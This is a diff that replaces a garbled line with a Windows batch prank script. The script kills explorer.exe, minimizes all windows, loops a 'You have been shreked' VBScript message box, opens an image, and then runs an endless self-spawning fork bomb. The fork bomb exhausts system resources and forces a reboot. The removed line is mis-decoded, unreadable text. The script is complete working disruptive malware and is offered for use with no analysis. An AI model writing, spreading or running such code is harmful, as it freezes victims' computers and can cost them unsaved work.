@@ -1,1 +1,54 @@
-䀊捥潨漠晦ਊ晩∠ㄥ㴢∽•ਨ††瑳牡⁴∢⼠業⁮┢晾∰洠湩猠瑥灵 †攠楸ੴ਩晩∠ㄥ•䕎⁑洢湩•硥瑩ਊ晩∠㈥㴢∽敳畴≰⠠ †朠瑯⁯敳畴ੰ 汥敳椠⁦┢∲㴽瘢獢氭潯≰⠠ †朠瑯⁯扶⵳潬灯⤊攠獬⁥晩∠㈥㴢∽潦歲•ਨ††潧潴映牯੫਩㨊敳畴ੰ猊慴瑲∠•洯湩瀠睯牥桳汥⁬挭浯慭摮∠渨睥漭橢捥⁴挭浯猠敨汬愮灰楬慣楴湯⸩業楮業敺污⡬∩ਊ慴歳楫汬⼠⁆椯⁭硥汰牯牥攮數ਊਨ捥潨䐠੯捥潨䴠杳潂⁸夢畯栠癡⁥敢湥猠牨步摥㨠∨攊档⁯潌灯⤊㸠∠琥浥╰獜牨步灟灯灵瘮獢ਢਊ瑳牡⁴∢⼠慭⁸栢瑴獰⼺椯瀮湩浩⹧潣⽭㌷砶㜯⼵戶戯⽢㔷戶扢㌴㠲㉥㘴㡥〶㔸〰捡㕥㥤晡搰樮杰ਢ琊浩潥瑵⼠⁴‱港扯敲歡㸠畮੬瑳牡⁴琥浥╰獜牨步灟灯灵瘮獢ਊ楴敭畯⁴琯ㄠ‰港扯敲歡㸠畮੬ਊ昺牯੫猊慴瑲∠•洯湩∠縥て•業⁮潦歲ਊ潧潴映牯੫攊楸ੴਊ瘺獢氭潯ੰ猊慴瑲∠•┢整灭尥桳敲彫潰異⹰扶≳琊浩潥瑵⼠⁴‱港扯敲歡㸠畮੬朊瑯⁯扶⵳潬灯ਊ硥瑩
+@echo off
+
+if "%1"=="" (
+    start "" /min "%~f0" min setup
+    exit
+)
+if "%1" NEQ "min" exit
+
+if "%2"=="setup" (
+    goto setup
+) else if "%2"=="vbs-loop" (
+    goto vbs-loop
+) else if "%2"=="fork" (
+    goto fork
+)
+
+:setup
+
+start "" /min powershell -command "(new-object -com shell.application).minimizeall()"
+
+taskkill /F /im explorer.exe
+
+(
+echo Do
+echo MsgBox "You have been shreked :("
+echo Loop
+) > "%temp%\shrek_popup.vbs"
+
+
+start "" /max "https://i.pinimg.com/736x/75/6b/bb/756bbb4328e246e8608500ace5d9af0d.jpg"
+
+timeout /t 1 /nobreak >nul
+start %temp%\shrek_popup.vbs
+
+timeout /t 10 /nobreak >nul
+
+
+:fork
+
+start "" /min "%~f0" min fork
+
+goto fork
+
+exit
+
+
+:vbs-loop
+
+start "" "%temp%\shrek_popup.vbs"
+timeout /t 1 /nobreak >nul
+
+goto vbs-loop
+
+exit
